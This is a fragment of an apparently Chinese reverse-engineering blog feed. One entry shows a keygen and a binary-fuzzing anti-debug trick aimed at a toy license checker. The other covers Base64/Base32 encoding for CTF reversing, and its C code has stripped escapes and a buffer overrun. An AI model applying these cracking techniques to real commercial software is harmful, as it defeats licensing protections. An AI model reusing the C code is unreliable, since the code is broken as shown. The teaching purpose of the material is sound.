class="number">1</span>], <span class="string">"AAAA-Z10N-42-OK"</span>)==<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Access Granted!\n"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"WRONG!\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Usage: &lt;key&gt;\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat 1.c</span><br><span class="line">gcc 1.c –o test1</span><br><span class="line">./test1 AAAA-Z10N-42-OK</span><br><span class="line"></span><br><span class="line">Crack：  strings test1</span><br></pre></td></tr></table></figure><h2 id="扰乱密钥加密"><a href="#扰乱密钥加密" class="headerlink" title="扰乱密钥加密"></a>扰乱密钥加密</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc==<span class="number">2</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Checking License: %s\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(argv[<span class="number">1</span>]); i++) </span><br><span class="line">            &#123;</span><br><span class="line">                sum+= (<span class="keyword">int</span>)argv[<span class="number">1</span>][i];  <span class="comment">//ASCII累加</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Value: %d\n"</span>, sum);</span><br><span class="line">        <span class="keyword">if</span>(sum==<span class="number">916</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Access Granted!\n"</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"WRONG!\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Usage: &lt;key&gt;\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">keygen2.py</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_key</span><span class="params">(key)</span>:</span></span><br><span class="line">    char_sum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> key:</span><br><span class="line">        char_sum += ord(c)</span><br><span class="line">    sys.stdout.write(<span class="string">"&#123;0:3&#125; | &#123;1&#125;      \r"</span>.format(char_sum, key))    <span class="comment"># print</span></span><br><span class="line">    sys.stdout.flush()                                               <span class="comment"># 一秒输出一行</span></span><br><span class="line">    <span class="keyword">return</span> char_sum</span><br><span class="line"></span><br><span class="line">key = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    key += random.choice(<span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_"</span>)</span><br><span class="line">    s = check_key(key)</span><br><span class="line">    <span class="keyword">if</span> s &gt; <span class="number">916</span>:</span><br><span class="line">        key = <span class="string">""</span></span><br><span class="line">    <span class="keyword">elif</span> s==<span class="number">916</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Found valid key: &#123;0&#125;"</span>.format(key)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">将输入key的ASCII累加，与注册码魔术值比较，达到隐藏密钥的效果</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/09/15/5b9d1ccc080af.jpg" alt=""></p><h2 id="使用FUZZ进行反调试"><a href="#使用FUZZ进行反调试" class="headerlink" title="使用FUZZ进行反调试"></a>使用FUZZ进行反调试</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">"cp test2 test2_fuzz"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flip_byte</span><span class="params">(in_bytes)</span>:</span></span><br><span class="line">    i = random.randint(<span class="number">0</span>,len(in_bytes))</span><br><span class="line">    c = chr(random.randint(<span class="number">0</span>,<span class="number">0xFF</span>))</span><br><span class="line">    <span class="keyword">return</span> in_bytes[:i]+c+in_bytes[i+<span class="number">1</span>:]         <span class="comment"># 随机字符</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">copy_binary</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"test2"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> orig_f, open(<span class="string">"test2_fuzz"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> new_f:   <span class="comment"># 二进制复制</span></span><br><span class="line">        new_f.write(flip_byte(orig_f.read()))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compare</span><span class="params">(fn1, fn2)</span>:</span>                                          <span class="comment"># 检查fuzz文件能否运行</span></span><br><span class="line">    <span class="keyword">with</span> open(fn1) <span class="keyword">as</span> f1, open(fn2) <span class="keyword">as</span> f2:</span><br><span class="line">        <span class="keyword">return</span> f1.read()==f2.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_output</span><span class="params">()</span>:</span>                                                           <span class="comment"># 检查文件是否存在</span></span><br><span class="line">    os.system(<span class="string">"(./test2_fuzz ; ./test2_fuzz AAAA-Z10N-42-OK) &gt; fuzz_output"</span>)</span><br><span class="line">    <span class="keyword">return</span> compare(<span class="string">"orig_output"</span>, <span class="string">"fuzz_output"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_gdb</span><span class="params">()</span>:</span></span><br><span class="line">    os.system(<span class="string">"echo disassemble main | gdb test2_fuzz &gt; fuzz_gdb"</span>)           <span class="comment"># 重定向到新文件</span></span><br><span class="line">    <span class="keyword">return</span> compare(<span class="string">"orig_gdb"</span>, <span class="string">"fuzz_gdb"</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">def check_radare():</span></span><br><span class="line"><span class="string">    os.system('echo -e "aaa\ns sym.main\npdf" | radare2 test2_fuzz &gt; fuzz_radare')</span></span><br><span class="line"><span class="string">    return compare("orig_radare", "fuzz_radare")</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    copy_binary()</span><br><span class="line">    <span class="keyword">if</span> check_output() <span class="keyword">and</span> <span class="keyword">not</span> check_gdb(): <span class="comment"># and not check_radare():</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"FOUND POSSIBLE FAIL\n\n\n"</span></span><br><span class="line">        os.system(<span class="string">"tail fuzz_gdb"</span>)</span><br><span class="line">        <span class="comment"># os.system("tail fuzz_radare")</span></span><br><span class="line">        raw_input()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输出orig二进制文件</span><br><span class="line"></span><br><span class="line">     (./test2_fuzz  ; ./test2_fuzz  AAAA-Z10N-42-OK)  &gt;  orig_output</span><br><span class="line">     echo disassemble main | gdb test2_fuzz &gt; orig_gdb</span><br><span class="line"></span><br><span class="line">Fuzz</span><br><span class="line">     ./fuzz.py</span><br><span class="line"></span><br><span class="line">验证</span><br><span class="line">    gdb test2_fuzz</span><br><span class="line">    disassemble main</span><br></pre></td></tr></table></figure><p>From <a href="https://kabeor.github.io/Linux程序破解与反破解/">https://kabeor.github.io/Linux程序破解与反破解/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Linux程序破解与反破解&quot;&gt;&lt;a href=&quot;#Linux程序破解与反破解&quot; class=&quot;headerlink&quot; title=&quot;Linux程序破解与反破解&quot;&gt;&lt;/a&gt;Linux程序破解与反破解&lt;/h1&gt;&lt;h2 id=&quot;1-许可证密钥位于二进制文件内&quot;&gt;&lt;a h
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Base-N算法及逆向初探</title>
    <link href="https://kabeor.github.io/Base-N%E7%AE%97%E6%B3%95%E5%8F%8A%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/"/>
    <id>https://kabeor.github.io/Base-N算法及逆向初探/</id>
    <published>2018-09-07T11:31:32.919Z</published>
    <updated>2018-09-07T13:19:37.572Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Base-N算法及逆向初探"><a href="#Base-N算法及逆向初探" class="headerlink" title="Base-N算法及逆向初探"></a>Base-N算法及逆向初探</h1><p>上次研究了<a href="https://kabeor.cn/CRC%E6%A0%A1%E9%AA%8C%E7%AE%97%E6%B3%95%E5%8F%8A%E9%80%86%E5%90%91%E6%96%B9%E6%B3%95%E5%88%9D%E6%8E%A2/" target="_blank" rel="noopener">CRC校验</a>，这次来看一下Base-N系列的算法吧</p><p>在CTF的算法逆向中Base系列算是最常见的了，各种组合和变体，下面就具体来说说吧。</p><h2 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h2><h3 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h3><blockquote><p>Base64是一种基于64个可打印字符来表示二进制数据的表示方法。由于2^6=64，所以每6个比特为一个单元，对应某个可打印字符。3个字节有24个比特，对应于4个Base64单元，即3个字节可由4个可打印字符来表示。它可用来作为电子邮件的传输编码。在Base64中的可打印字符包括字母A-Z、a-z、数字0-9，这样共有62个字符，此外两个可打印符号在不同的系统中而不同。一些如uuencode的其他编码方法，和之后BinHex的版本使用不同的64字符集来代表6个二进制数字，但是不被称为Base64。</p><p>Base64常用于在通常处理文本数据的场合，表示、传输、存储一些二进制数据，包括MIME的电子邮件及XML的一些复杂数据。           —–维基百科 <a href="https://zh.wikipedia.org/wiki/Base64" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Base64</a></p></blockquote><h4 id="编码规则"><a href="#编码规则" class="headerlink" title="编码规则"></a>编码规则</h4><blockquote><p>第一步，将每三个字节作为一组，一共是24个二进制位<br>第二步，将这24个二进制位分为四组，每个组有6个二进制位<br>第三步，在每组前面加两个00，扩展成32个二进制位，即四个字节<br>第四步，根据下表，得到扩展后的每个字节的对应符号，这就是Base64的编码值</p></blockquote><p><img src="https://i.loli.net/2018/09/07/5b9264fbaee7c.jpg" alt=""></p><blockquote><p>如果要编码的字节数不能被3整除，最后会多出1个或2个字节，那么可以使用下面的方法进行处理：先使用0字节值在末尾补足，使其能够被3整除，然后再进行Base64的编码。在编码后的Base64文本后加上一个或两个=号，代表补足的字节数。也就是说，当最后剩余两个八位字节（2个byte）时，最后一个6位的Base64字节块有四位是0值，最后附加上两个等号；如果最后剩余一个八位字节（1个byte）时，最后一个6位的base字节块有两位是0值，最后附加一个等号。 参考下表：</p></blockquote><p><img src="https://i.loli.net/2018/09/07/5b9265e357faa.jpg" alt=""></p><h4 id="C代码实现"><a href="#C代码实现" class="headerlink" title="C代码实现"></a>C代码实现</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &quot;string.h&quot;   </span><br><span class="line">#include &quot;stdlib.h&quot;</span><br><span class="line"></span><br><span class="line">const char base[] = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;; </span><br><span class="line">static char find_pos(char ch);</span><br><span class="line">char *base64_encode(const char* data, int data_len,int *len);</span><br><span class="line">char *base64_decode(const char* data, int data_len,int *len);   </span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *找到ch在base中的位置 </span><br><span class="line"> */</span><br><span class="line">static char find_pos(char ch)    </span><br><span class="line">&#123;   </span><br><span class="line">    //the last position (the only) in base[] </span><br><span class="line">    char *ptr = (char*)strrchr(base, ch);  </span><br><span class="line">    return (ptr - base);   </span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *BASE64编码 </span><br><span class="line"> */</span><br><span class="line">char *base64_encode(const char* data, int data_len,int *len)   </span><br><span class="line">&#123;      </span><br><span class="line">    int prepare = 0;   </span><br><span class="line">    int ret_len;   </span><br><span class="line">    *len=0;</span><br><span class="line">    int temp = 0;   </span><br><span class="line">    char *ret = NULL;   </span><br><span class="line">    char *f = NULL;   </span><br><span class="line">    int tmp = 0;   </span><br><span class="line">    char changed[4];   </span><br><span class="line">    int i = 0;   </span><br><span class="line">    ret_len = data_len / 3;   </span><br><span class="line">    temp = data_len % 3;   </span><br><span class="line">    if (temp &gt; 0)   </span><br><span class="line">    &#123;   </span><br><span class="line">        ret_len += 1;   </span><br><span class="line">    &#125;   </span><br><span class="line">    //最后一位以&apos;&apos;结束  </span><br><span class="line">    ret_len = ret_len*4 + 1;   </span><br><span class="line">    ret = (char *)malloc(ret_len);   </span><br><span class="line"></span><br><span class="line">    if ( ret == NULL)   </span><br><span class="line">    &#123;   </span><br><span class="line">        printf(&quot;No enough memory.n&quot;);   </span><br><span class="line">        exit(0);   </span><br><span class="line">    &#125;   </span><br><span class="line">    memset(ret, 0, ret_len);   </span><br><span class="line">    f = ret; </span><br><span class="line">    //tmp记录data中移动位置   </span><br><span class="line">    while (tmp &lt; data_len)   </span><br><span class="line">    &#123;   </span><br><span class="line">        temp = 0;   </span><br><span class="line">        prepare = 0;   </span><br><span class="line">        memset(changed, 0, 4);   </span><br><span class="line">        while (temp &lt; 3)   </span><br><span class="line">        &#123;      </span><br><span class="line">            if (tmp &gt;= data_len)   </span><br><span class="line">            &#123;   </span><br><span class="line">                break;   </span><br><span class="line">            &#125;  </span><br><span class="line">            //将data前8*3位移入prepare的低24位  </span><br><span class="line">            prepare = ((prepare &lt;&lt; 8) | (data[tmp] &amp; 0xFF));   </span><br><span class="line">            tmp++;   </span><br><span class="line">            temp++;   </span><br><span class="line">        &#125;   </span><br><span class="line">        //将有效数据移到以prepare的第24位起始位置 </span><br><span class="line">        prepare = (prepare&lt;&lt;((3-temp)*8));   </span><br><span class="line"></span><br><span class="line">        for (i = 0; i &lt; 4 ;i++ )   </span><br><span class="line">        &#123;   </span><br><span class="line">            //最后一位或两位 </span><br><span class="line">            if (temp &lt; i)   </span><br><span class="line">            &#123;   </span><br><span class="line">                changed[i] = 0x40;   </span><br><span class="line">            &#125;   </span><br><span class="line">            else</span><br><span class="line">            &#123;   </span><br><span class="line">                //24位数据 </span><br><span class="line">                changed[i] = (prepare&gt;&gt;((3-i)*6)) &amp; 0x3F;   </span><br><span class="line">            &#125;   </span><br><span class="line">            *f = base[changed[i]];   </span><br><span class="line"></span><br><span class="line">            f++; </span><br><span class="line">            (*len)++;  </span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;   </span><br><span class="line">    *f = &apos;&apos;;   </span><br><span class="line"></span><br><span class="line">    return ret;   </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *BASE64解码 </span><br><span class="line"> */</span><br><span class="line">char *base64_decode(const char *data, int data_len,int *len)   </span><br><span class="line">&#123;   </span><br><span class="line">    int ret_len = (data_len / 4) * 3+1;   </span><br><span class="line">    int equal_count = 0;   </span><br><span class="line">    char *ret = NULL;   </span><br><span class="line">    char *f = NULL;   </span><br><span class="line">    *len=0;</span><br><span class="line">    int tmp = 0;   </span><br><span class="line">    int temp = 0;   </span><br><span class="line">    char need[3];   </span><br><span class="line">    int prepare = 0;   </span><br><span class="line">    int i = 0;   </span><br><span class="line">    if (*(data + data_len - 1) == &apos;=&apos;)   </span><br><span class="line">    &#123;   </span><br><span class="line">        equal_count += 1;   </span><br><span class="line">    &#125;   </span><br><span class="line">    if (*(data + data_len - 2) == &apos;=&apos;)   </span><br><span class="line">    &#123;   </span><br><span class="line">        equal_count += 1;   </span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">    ret = (char *)malloc(ret_len);   </span><br><span class="line">    if (ret == NULL)   </span><br><span class="line">    &#123;   </span><br><span class="line">        printf(&quot;No enough memory.n&quot;);   </span><br><span class="line">        exit(0);   </span><br><span class="line">    &#125;   </span><br><span class="line">    memset(ret, 0, ret_len);   </span><br><span class="line">    f = ret;   </span><br><span class="line">    while (tmp &lt; (data_len - equal_count))   </span><br><span class="line">    &#123;   </span><br><span class="line">        temp = 0;   </span><br><span class="line">        prepare = 0;   </span><br><span class="line">        memset(need, 0, 4);   </span><br><span class="line">        while (temp &lt; 4)   </span><br><span class="line">        &#123;   </span><br><span class="line">            if (tmp &gt;= (data_len - equal_count))   </span><br><span class="line">            &#123;   </span><br><span class="line">                break;   </span><br><span class="line">            &#125;   </span><br><span class="line">            prepare = (prepare &lt;&lt; 6) | (find_pos(data[tmp]));   </span><br><span class="line">            temp++;   </span><br><span class="line">            tmp++;   </span><br><span class="line">        &#125;   </span><br><span class="line">        prepare = prepare &lt;&lt; ((4-temp) * 6);   </span><br><span class="line">        for (i=0; i&lt;3 ;i++ )   </span><br><span class="line">        &#123;   </span><br><span class="line">            if (i == temp)   </span><br><span class="line">            &#123;   </span><br><span class="line">                break;   </span><br><span class="line">            &#125;   </span><br><span class="line">            *f = (char)((prepare&gt;&gt;((2-i)*8)) &amp; 0xFF);   </span><br><span class="line">            f++;</span><br><span class="line">            (*len)++;   </span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">    *f = &apos;&apos;; </span><br><span class="line">    if(data[data_len-1]==&apos;=&apos;)</span><br><span class="line">    &#123;</span><br><span class="line">        (*len)--;</span><br><span class="line">    &#125;</span><br><span class="line">    /*</span><br><span class="line">    while(*(--f)==&apos;&apos;)</span><br><span class="line">    &#123;</span><br><span class="line">      (*len)--;</span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line">    */</span><br><span class="line">    return ret;   </span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    char *former = &quot;hello&quot;;</span><br><span class="line">    int len1,len2;</span><br><span class="line">    printf(&quot;%sn&quot;,former);</span><br><span class="line">    char *after = base64_encode(former, 5,&amp;len1);</span><br><span class="line">    printf(&quot;%d %sn&quot;,len1,after);</span><br><span class="line">    former = base64_decode(after, len1,&amp;len2);</span><br><span class="line">    printf(&quot;%d %sn&quot;,len2,former);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逆向识别后面一块说，先来看看Base32吧</p><h3 id="Base32"><a href="#Base32" class="headerlink" title="Base32"></a>Base32</h3><h4 id="编码规则-1"><a href="#编码规则-1" class="headerlink" title="编码规则"></a>编码规则</h4><p> Base32这种数据编码机制，主要用来把二进制数据编码成可见的字符串，其编码规则是：任意给定一个二进制数据，以5个位(bit)为一组进行切分(base64以6个位(bit)为一组)，对切分而成的每个组进行编码得到1个可见字符。Base32编码表字符集中的字符总数为25=32个，这也是Base32名字的由来。</p><p> 下面是Base32的table</p><p> <img src="https://i.loli.net/2018/09/07/5b926bef87d6a.jpg" alt=""></p><h4 id="C代码实现-1"><a href="#C代码实现-1" class="headerlink" title="C代码实现"></a>C代码实现</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">//base32 表包含 0~9 以及小写字母 (去除&apos;a&apos;,&apos;i&apos;,&apos;l&apos;,&apos;o&apos;)，</span><br><span class="line">//共 32 个字符</span><br><span class="line">static const char base32_alphabet[32] = &#123;</span><br><span class="line">        &apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;,</span><br><span class="line">        &apos;8&apos;, &apos;9&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;, &apos;e&apos;, &apos;f&apos;, &apos;g&apos;,</span><br><span class="line">        &apos;h&apos;, &apos;j&apos;, &apos;k&apos;, &apos;m&apos;, &apos;n&apos;, &apos;p&apos;, &apos;q&apos;, &apos;r&apos;,</span><br><span class="line">        &apos;s&apos;, &apos;t&apos;, &apos;u&apos;, &apos;v&apos;, &apos;w&apos;, &apos;x&apos;, &apos;y&apos;, &apos;z&apos;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * 匹配 base32_alphabet</span><br><span class="line"> */</span><br><span class="line">int find_number(char m) &#123;</span><br><span class="line">    int i;</span><br><span class="line">    for(i = 0; i &lt; 32; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        if(m == base32_alphabet[i])</span><br><span class="line">            return i;</span><br><span class="line">    &#125;</span><br><span class="line">    return -1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * base32 编码</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">char* base32_encode(char *bin_source)&#123;</span><br><span class="line">    int i;</span><br><span class="line">    int j = 0;</span><br><span class="line">    static char str[10];</span><br><span class="line"></span><br><span class="line">    for(i=0;i&lt;strlen(bin_source);++i)&#123;</span><br><span class="line">        if((i+1)%5==0)&#123;</span><br><span class="line">            j++;</span><br><span class="line">            int num = (bin_source[i]-&apos;0&apos;)+(bin_source[i-1]-&apos;0&apos;)*2\</span><br><span class="line">            +(bin_source[i-2]-&apos;0&apos;)*2*2+(bin_source[i-3]-&apos;0&apos;)*2*2*2\</span><br><span class="line">            +(bin_source[i-4]-&apos;0&apos;)*2*2*2*2;</span><br><span class="line"></span><br><span class="line">            str[j-1] = base32_alphabet[num];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    return str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * base32 解码</span><br><span class="line"> */</span><br><span class="line">int* base32_decode(char *str_source)&#123;</span><br><span class="line">    int i,j;</span><br><span class="line">    static int dec[50];</span><br><span class="line">    int count=0;</span><br><span class="line">    for(i=0;i&lt;strlen(str_source);++i)&#123;</span><br><span class="line">        for(j=5-1;j&gt;=0;--j)&#123;</span><br><span class="line">            count++;</span><br><span class="line">            //位运算十进制转二进制</span><br><span class="line">            dec[count-1] = find_number(str_source[i])&gt;&gt;(j%5)&amp;1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return dec;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>前面写了这么多，终于到重头戏逆向了，先简略概括一下基本运算法则吧</p><blockquote><p>base64编码是用64（2的6次方）个ASCII字符来表示256（2的8次方）个ASCII字符，也就是三位二进制数组经过编码后变为四位的ASCII字符显示，长度比原来增加1/3。</p><p>同样，base32就是用32（2的5次方）个特定ASCII码来表示256个ASCII码。所以，5个ASCII字符经过base32编码后会变为8个字符（公约数为40），长度增加3/5.不足8n用“=”补足。</p><p>base16就是用16（2的4次方）个特定ASCII码表示256个ASCII字符。1个ASCII字符经过base16编码后会变为2个字符，长度增加一倍。不足2n用“=”补足</p></blockquote><p>Base32在比赛中常见到，就拿Base32的题来举例了</p><p>两道题的完整wp都在博客里 ,(<a href="https://kabeor.cn/2017%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9BNonstandard/" target="_blank" rel="noopener">https://kabeor.cn/2017%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9BNonstandard/</a>          ,<br><a href="https://kabeor.cn/2018%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%20RE(1)%20Simple%20Base-N/" target="_blank" rel="noopener">https://kabeor.cn/2018%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%20RE(1)%20Simple%20Base-N/</a>)</p><p>提取重点部分来说</p><h3 id="1-数据"><a href="#1-数据" class="headerlink" title="1. 数据"></a>1. 数据</h3><p>Base系列的补位“=”算是最明显的提示标志了，搜索字符串时见到类似下图就可以考虑Base了</p><p><img src="https://i.loli.net/2018/07/15/5b4b3ffbc388a.jpg" alt=""></p><h3 id="2-反汇编伪代码"><a href="#2-反汇编伪代码" class="headerlink" title="2. 反汇编伪代码"></a>2. 反汇编伪代码</h3><p>IDA F5，看到大量移位，如图</p><p><img src="https://i.loli.net/2018/07/15/5b4b3ffbea9c0.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">        v14 = v13;</span><br><span class="line">        HIDWORD(v15) = v19;</span><br><span class="line">        LODWORD(v15) = v23 &amp; 0xFFFFFFF8;</span><br><span class="line">        HIDWORD(v16) = v30 | ((unsigned __int64)(v18 &amp; 1) &gt;&gt; 24);</span><br><span class="line">        LODWORD(v16) = (((v23 &amp; 0xFFFFFFF8) &lt;&lt; 8) + (v18 &amp; 0xFFFFFFC0 | ((v23 &amp; 7) &lt;&lt; 8)) + (v18 &amp; 0x3E)) &lt;&lt; 8;</span><br><span class="line">        v17 = ((v14 &amp; 0x1F)</span><br><span class="line">             + __PAIR__(</span><br><span class="line">                 HIDWORD(v14) | (unsigned int)((unsigned __int64)(v20 &amp; 3) &gt;&gt; 24),</span><br><span class="line">                 v14 &amp; 0xFFFFFFE0 | ((v20 &amp; 3) &lt;&lt; 8))</span><br><span class="line">             + ((__PAIR__(</span><br><span class="line">                   v31 | (unsigned int)((unsigned __int64)(v21 &amp; 0xF) &gt;&gt; 24),</span><br><span class="line">                   v20 &amp; 0xFFFFFF80 | ((v21 &amp; 0xF) &lt;&lt; 8))</span><br><span class="line">               + ((__PAIR__(</span><br><span class="line">                     (__PAIR__(v15 &gt;&gt; 24, (v23 &amp; 0xFFFFFFF8) &lt;&lt; 8)</span><br><span class="line">                    + __PAIR__(</span><br><span class="line">                        v29 | (unsigned int)((unsigned __int64)(v23 &amp; 7) &gt;&gt; 24),</span><br><span class="line">                        v18 &amp; 0xFFFFFFC0 | ((v23 &amp; 7) &lt;&lt; 8))</span><br><span class="line">                    + (v18 &amp; 0x3E)) &gt;&gt; 24,</span><br><span class="line">                     v21 &amp; 0xFFFFFFF0 | ((v18 &amp; 1) &lt;&lt; 8))</span><br><span class="line">                 + v16) &lt;&lt; 8)</span><br><span class="line">               + (v20 &amp; 0x7C)) &lt;&lt; 8)) &gt;&gt; 32;</span><br><span class="line">        HIDWORD(v14) = (v14 &amp; 0x1F)</span><br><span class="line">                     + (v14 &amp; 0xFFFFFFE0 | ((v20 &amp; 3) &lt;&lt; 8))</span><br><span class="line">                     + (((v20 &amp; 0xFFFFFF80 | ((v21 &amp; 0xF) &lt;&lt; 8))</span><br><span class="line">                       + (((v21 &amp; 0xFFFFFFF0 | ((v18 &amp; 1) &lt;&lt; 8)) + (_DWORD)v16) &lt;&lt; 8)</span><br><span class="line">                       + (v20 &amp; 0x7C)) &lt;&lt; 8);</span><br><span class="line">        *v24 = byte_403020[(unsigned __int8)v17 &gt;&gt; 3];</span><br><span class="line">        v24[1] = byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; 30) &amp; 0x1F];</span><br><span class="line">        v24[2] = byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; 25) &amp; 0x1F];</span><br><span class="line">        v24[3] = byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; 20) &amp; 0x1F];</span><br><span class="line">        v24[4] = byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; 15) &amp; 0x1F];</span><br><span class="line">        v24[5] = byte_403020[(__PAIR__(v17, 